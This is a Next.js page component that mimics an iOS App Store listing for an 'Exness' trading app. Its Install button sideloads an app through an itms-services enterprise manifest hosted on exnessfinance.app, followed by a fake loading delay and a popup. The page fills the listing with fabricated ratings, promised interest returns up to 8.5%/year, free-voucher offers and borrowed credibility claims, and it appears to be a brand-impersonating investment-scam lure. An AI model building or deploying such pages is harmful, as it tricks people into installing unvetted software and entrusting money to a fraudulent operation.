import React, { useEffect, useState } from "react";
import useEmblaCarousel from "embla-carousel-react";
import localFont from "next/font/local";
import styles from "./Ios.module.css";
import Link from "next/link";
import { NAME_APP } from "@/lib/general";
import Head from "next/head";
// import Script from "next/script";
// import Script from "../lib/script.js";
// Font files can be colocated inside of `pages`
// const myFont = localFont({
//   src: [
//     {
//       path: "../public/font/sfpro/SF-Pro-Text-Regular.otf",
//     },
//     {
//       path: "../public/font/sfpro/SF-Pro-Text-RegularItalic.otf",
//     },
//     {
//       path: "../public/font/sfpro/SF-Pro-Text-Bold.otf",
//     },
//   ],
// });
export default function Ios() {
  const [emblaRef] = useEmblaCarousel();
  const [emblaRefOther] = useEmblaCarousel();

  // Hàm để xử lý khi click vào nút "readmorefea"

  useEffect(() => {
    const handleReadMoreClick = () => {
      const readmorefea = document.querySelector("#readmorefea");
      const morefea = document.querySelector("#morefea");
      if (readmorefea && morefea) {
        readmorefea.style.display = "none";
        morefea.style.display = "block";
      }
    };

    // Gán sự kiện click cho phần tử "#readmorefea"
    const readmoreButton = document.querySelector("#readmorefea");
    if (readmoreButton) {
      readmoreButton.addEventListener("click", handleReadMoreClick);
    }
    // Cleanup: remove event listener
    return () => {
      if (readmoreButton) {
        readmoreButton.removeEventListener("click", handleReadMoreClick);
      }
    };
  }, []);
  useEffect(() => {
    const handleReadMoreClick = () => {
      const readmoredes = document.querySelector("#readmoredes");
      const more = document.querySelector("#more");

      if (readmoredes && more) {
        readmoredes.style.display = "none";
        more.style.display = "block";
      }
    };

    // Gán sự kiện click cho phần tử "#readmorefea"
    const readmoredesButton = document.querySelector("#readmoredes");

    if (readmoredesButton) {
      readmoredesButton.addEventListener("click", handleReadMoreClick);
    }
    // Cleanup: remove event listener
    return () => {
      if (readmoredesButton) {
        readmoredesButton.removeEventListener("click", handleReadMoreClick);
      }
    };
  }, []);
  useEffect(() => {
    const handleDownloadClick = () => {
      const downloadBtn = document.querySelector(".download-btn");
      if (downloadBtn) {
        downloadBtn.classList.add("button--loading");
        setTimeout(() => {
          downloadBtn.classList.remove("button--loading");
          const popUpDown = document.querySelector(".pop-up-down");
          if (popUpDown) {
            popUpDown.style.display = "block";
            document.body.style.overflow = "hidden";
          }
        }, 7000);
      }
    };

    const handlePopUpClose = () => {
      const popUpDown = document.querySelector(".pop-up-down");
      if (popUpDown) {
        popUpDown.style.display = "none";
        document.body.style.overflow = "visible";
      }
    };

    // Gán sự kiện click cho phần tử ".download-btn"
    const downloadBtn = document.querySelector(".download-btn");
    if (downloadBtn) {
      downloadBtn.addEventListener("click", handleDownloadClick);
    }

    // Gán sự kiện click cho phần tử ".pop-up-down span"
    const popUpClose = document.querySelector(".pop-up-down span");
    if (popUpClose) {
      popUpClose.addEventListener("click", handlePopUpClose);
    }

    // Cleanup: remove event listeners
    return () => {
      if (downloadBtn) {
        downloadBtn.removeEventListener("click", handleDownloadClick);
      }
      if (popUpClose) {
        popUpClose.removeEventListener("click", handlePopUpClose);
      }
    };
  }, []);
  return (
    <>
      <main id="site-main" className={styles.fontios}>
        <div className="pop-up-down">
          <div className="container">
            <p>
            Please return to the home screen to check the application download progress.
            </p>
            <span>Close</span>
          </div>
        </div>
        <section className="product">
          <div className="product-logo">
            <img src="/111.png" alt="photo" />
          </div>
          <div className="product-control">
            <div className="head">
              <h2>{NAME_APP} - Diverse trading products</h2>
              <span>{NAME_APP}</span>
            </div>
            <div className="control">
              <a
                className="download download-btn"
                href="itms-services://?action=download-manifest&amp;url=https://exnessfinance.app/app.plist"
              >
                <span className="button__text">Install</span>
              </a>

              <Link href="#" className="btnUpload">
                <img src="/images/ios/upload.svg" alt="photo" />
              </Link>
            </div>
          </div>
        </section>
        <section className="slider-inf">
          <div className="wrapper">
            <ul className="items">
              <li className="item">
                <div>
                  <span>2,5N RATING</span>
                  <span>4,5</span>
                  <span>5 stars</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>YEAR OLD</span>
                  <span>4+</span>
                  <span>Year old</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>LIST</span>
                  <span>
                    <i className="fas fa-university"></i>
                  </span>
                  <span>Finance</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>DEVELOPER</span>
                  <span>
                    <i className="fas fa-portrait"></i>
                  </span>
                  <span>Exness</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>LANGUAGE</span>
                  <span>EN</span>
                  <span>English</span>
                </div>
              </li>
              <li className="item">
                <div>
                  <span>SIZE</span>
                  <span>211,5</span>
                  <span>MB</span>
                </div>
              </li>
            </ul>
          </div>
        </section>
        <section className="feature">
          <div className="head">
            <h3>New Features</h3>
            <Link href="#">Version history</Link>
          </div>
          <div className="not">
            <span>Version 2.3.7</span>
            <span>1 week ago</span>
          </div>
          <div className="desc">
            <div className="det">
              <p>What's new in Version 2.3.7?</p>
              <p>
              - Invite friends to join the group accumulation to receive higher interest rates
              </p>
              <a
                id="readmorefea"
                // style={{ display: showMore ? "none" : "block" }}
                // onClick={handleReadMoreClick}
              >
                more
              </a>
            </div>
            <p
              id="morefea"
              // style={{ display: showMore ? "block" : "none" }}
            >
              - Your experience in the Community Tab is also enhanced.
            </p>
          </div>
        </section>
        <section className="screenshot">
          <h2>Preview</h2>
          <div className="embla" ref={emblaRef}>
            <div className="embla__container">
              <div className="embla__slide">
                <img src="/a1.jpg" alt="photo" width={300} />
              </div>
              <div className="embla__slide">
                <img src="/a2.jpg" alt="photo" width={300} />
              </div>
              <div className="embla__slide">
                <img src="/a3.jpg" alt="photo" width={300} />
              </div>
              <div className="embla__slide">
                <img src="/a4.jpg" alt="photo" width={300} />
              </div>
            </div>
          </div>

          <div className="device">
            <span>Phone</span>
            <img src="/images/ios/phone.svg" alt="photo" />
          </div>
        </section>
        <section className="description">
          <div className="dis">
            <p>
              {NAME_APP} - Simple and safe online stock investment & accumulation app from only 10 USD.
            </p>
            <p>• RECEIVE FREE STOCK INVESTMENT VOUCHER NOW!</p>
            <a href="#" id="readmoredes">
            more
            </a>
          </div>

          <div id="more">
            <p>
              {NAME_APP} Offering investors a free stock trading voucher after successfully verifying their account. Investors can easily trade stocks online right at home with a small capital.
            </p>
            <p>• ACCUMULATE ONLINE WITH ATTRACTIVE INTEREST RATE UP TO 8.5%/YEAR</p>
            <p>
            Investors can choose the form of online accumulation to automatically earn profits right on the Application {NAME_APP}. With attractive interest rates up to 8.5%/year for 3-month terms, 8%/year for 2-month terms and 7.5% for 30-day terms.
            </p>
            <p>• INTEGRATED COMMUNITY WITH COPY TRADING FEATURE</p>
            <p>
            Not just a stock investment App, {NAME_APP} We also develop the Community feature - a place for all those who are passionate, have ideals and intend to invest in stocks. Community {NAME_APP} allowing users to share, discuss and interact without limits. In particular, users can copy stock transactions right in the application simply and easily.
            </p>
            <p>• BUY - SELL STOCKS FROM ONLY 10 USD</p>
            <p>
              {NAME_APP} is a stock App that allows users to buy odd lot stocks, invest and make money with prices starting from only 10,000 VND. With {" "}
              {NAME_APP}, You can start your financial investment journey simpler and easier than ever.
            </p>
            <p>
            There is no need to spend up to millions of dong in capital like the Vietnamese stock exchange, online investors can save up to 90% of the minimum capital to invest in stocks through blue chip stocks (stocks of leading companies). large, reputable company with a solid financial situation, large market capitalization) right in the Application {NAME_APP}
              .
            </p>
            <p>• INVESTING IN ETF CERTIFICATE IS EASY</p>
            <p>
            Invest quickly and easily in ETF Fund Certificates on the Vietnam Stock Market with a starting capital of only 10,000 VND.
            </p>
            <p>• INVESTING IN STOCKS AND TRADING IS EXTREMELY SIMPLE</p>
            <p>
            Stock investment application {NAME_APP} has an easy-to-understand, easy-to-use interface, designed with a smooth experience and new investors in mind.
            </p>
            <p>
            - Open an account quickly with just a few steps and COMPLETELY FREE.
            </p>

            <p>
            - Trade stocks anytime, anywhere with 24/7 trading feature.
            </p>

            <p>
            - Invest in stocks at current market prices and update your balance instantly.
            </p>

            <p>
            - Easily manage stock investment portfolio with detailed statistical information and charts.
            </p>

            <p>• LEARN TO INVEST AND UPDATE NEWS FOR FREE</p>
            <p>
            Investors can study stocks and learn financial and investment knowledge from basic to advanced COMPLETELY FREE through the Knowledge feature on the App. {NAME_APP}. In addition, you can continuously update financial and market news on the stock investment App {NAME_APP}.
            </p>
            <p>• {NAME_APP} A TRUSTED COMPANION</p>
            <p>
            - Your information and account are absolutely secure thanks to the password protection system and 2-layer account authentication.
            </p>
            <p>
              - {NAME_APP} Carry out transactions of buying and selling securities through your account
              {NAME_APP} opened at VNDirect Securities Joint Stock Company.
            </p>
            <p>
              - {NAME_APP} has attracted a lot of investment capital from large domestic and foreign investors: Goodwater Capital, GFC, First Check Ventures, angel investors of XA Network...
            </p>
            <p>
              - {NAME_APP} also honored to be one of the first stock investment applications in Vietnam to participate in YC W22 Batch. Y Combinator is considered the most famous incubator for American startups.
            </p>
            <p>
            What are you waiting for? Download and Open an account right away {NAME_APP} to experience the convenient, simple and safe money-making investment App! With
              {NAME_APP}, You can completely feel secure when playing stocks with advanced, safe trading experiences.
            </p>
            <p>
            107 Cheapside, London, EC2V 6DN, United Kingdom
            </p>
            <p>Hotline: +44 1229 9896724.</p>
          </div>
          <div className="au">
            <div className="name">
              <h4>{NAME_APP}</h4>
              <span>Developer</span>
            </div>
            <img src="/images/ios/next.svg" alt="phone" />
          </div>
        </section>
        <section className="rating">
          <div className="head">
            <h3 className="title">Ratings & reviews</h3>
            <span>See all</span>
          </div>
          <div className="star">
            <div className="r">
              <span className="va">4,5</span>
              <span className="per">/ 5</span>
            </div>
            <ul className="l">
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <li>
                <span className="p">
                  <img src="/images/ios/star.svg" alt="photo" />
                </span>
                <span className="c"></span>
              </li>
              <p className="count">2.533 ratings</p>
            </ul>
          </div>
          <div className="vote"></div>
        </section>
        <section className="app-inf">
          <h2>Information</h2>
          <div className="wrapper">
            <ul className="items">
              <li className="item">
                <span> Supplier </span>
                <span> {NAME_APP} COMPANY LIMITED </span>
              </li>
              <li className="item">
                <span> Size </span>
                <span> 208,4 MB </span>
              </li>
              <li className="item">
                <span> Category </span>
                <span> Finance </span>
              </li>
              <li className="item">
                <span> Compatible </span>
                <span className="arr">
                On this iPhone
                  <img src="/images/ios/down.svg" alt="photo" />
                </span>
              </li>
              <li className="item">
                <span> Language </span>
                <span> English </span>
              </li>
              <li className="item">
                <span> Year old </span>
                <span className="arr">
                  4+
                  <img src="/images/ios/down.svg" alt="photo" />
                </span>
              </li>
              <li className="item">
                <span> Buy In-App </span>
                <span className="arr">
                  Yes
                  <img src="/images/ios/down.svg" alt="photo" />
                </span>
              </li>
              <li className="item">
                <span> Copyright </span>
                <span> &copy; {NAME_APP} COMPANY LIMITED </span>
              </li>
              <div className="link">
                <li className="item">
                  <span>
                    <Link href="#">Developer website</Link>
                  </span>
                  <span>
                    <i className="fa-regular fa-compass"></i>
                  </span>
                </li>
                <li className="item">
                  <span>
                    <Link href="#">Privacy policy</Link>
                  </span>
                  <span>
                    <i className="fa-solid fa-hand"></i>
                  </span>
                </li>
                <li className="item">
                  <span>
                    <Link href="#">Report a problem</Link>
                  </span>
                  <span>
                    <img src="/images/ios/triangle.svg" alt="icon" />
                  </span>
                </li>
              </div>
            </ul>
          </div>
        </section>
        <section className="extend">
          <div className="head">
            <h2>You might also like it</h2>
            <span>See all</span>
          </div>
          <div className="app-extend">
            <div className="wrapper">
              <div className="embla_other" ref={emblaRefOther}>
                <ul className="embla__container_other">
                  <li className="embla__slide_other item">
                    <div className="ci">
                      <img src="/images/ios/e1.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>{NAME_APP} - Investment and Accumulation</h3>
                          <p>Investment and accumulation application</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Install</span>
                        </Link>
                      </div>
                    </div>
                    <div className="ci">
                      <img src="/images/ios/e2.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>Tikop - Flexible accumulation</h3>
                          <p>Save and accumulate</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Install</span>
                        </Link>
                      </div>
                    </div>
                  </li>
                  <li className="embla__slide_other item">
                    <div className="ci">
                      <img src="/images/ios/e3.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>Entrade X by DNSE: Stock</h3>
                          <p>Smart investment & finance</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Install</span>
                        </Link>
                      </div>
                    </div>
                    <div className="ci">
                      <img src="/images/ios/e4.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>KB Fina</h3>
                          <p>Consulting investment services</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Install</span>
                        </Link>
                      </div>
                    </div>
                  </li>
                  <li className="embla__slide_other item">
                    <div className="ci">
                      <img src="/images/ios/e5.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>ONUS</h3>
                          <p>Trusted by 3 million people</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Install</span>
                        </Link>
                      </div>
                    </div>
                    <div className="ci">
                      <img src="/images/ios/e6.webp" alt="photo" />
                      <div className="inf">
                        <div className="desc">
                          <h3>MBS Mobile</h3>
                          <p>MBSecurities</p>
                        </div>
                        <Link href="#">
                          <span className="btnd">Install</span>
                        </Link>
                      </div>
                    </div>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* <Script strategy="lazyOnload" src="/script.js" /> */}
    </>
  );
}
